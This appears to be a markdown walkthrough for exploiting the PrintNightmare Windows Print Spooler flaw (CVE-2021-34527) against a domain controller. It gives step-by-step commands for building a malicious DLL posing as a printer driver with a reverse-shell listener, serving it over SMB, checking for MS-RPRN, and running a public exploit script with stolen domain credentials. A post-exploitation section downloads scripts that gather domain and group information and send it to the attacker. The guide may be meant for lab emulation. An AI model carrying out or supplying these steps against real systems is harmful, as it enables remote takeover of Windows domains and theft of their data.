# PrintNightmare Windows Print Spooler Vulnerability (CVE2021-34527)
Ref: https://thedutchhacker.com/how-to-exploit-the-printnightmare-cve-2021-34527/

##Pre-exploitation

**Attacker**
1. Install Impacket and python script to exploit the vulnerability
2. Install metasploit (if you aren't using Kali), create a malicious dll as a faked printer driver and set up a listener on port 1443
3. Run SMB server service and modify the config file
4. Place the faked printer driver ```reverse.dll``` to the SMB path
5. Ensure the target is vulnerable to MS-RPRN (Print System Remote Protocol) by running (the vulnerability can't be exploited if the protocol isn't enabled)
   ```console
   rpcdump.py <username>:<password>:@<target IP addr> | grep MS-RPRN
   ```

6. Exploit the PrintNightmare vulnerability to the target machine
   Download the python script: https://github.com/m8sec/CVE-2021-34527?tab=readme-ov-file
   
```console
   sudo python3 CVE-2021-34527.py -u <username> -p <password> -d <domain controller IP addr> -dll <path/path/to/maliciousdll> <domain IP addr>
```

**Target machine**
1. Ensure the Domain Controller is running the Print Spooler Service and is vulnerable by checking the service 
```Powershell
PS C:\Users\Administrator> get-service spooler
PS C:\Users\Administrator> start-service spooler
```
**e.g. replace ```<username>``` with a domain user account login credential

# Guides to emulate the vulnerability
Post-exploitation
Download 2 scripts to discover victim DC machine and domain group info, then send them back to attacker listener. 

```powershell
PS Invoke-WebRequest -Uri path/to/discovery.bat -o discovery.bat
PS Invoke-WebRequest -Uri path/to/export.bat -o export.bat
```

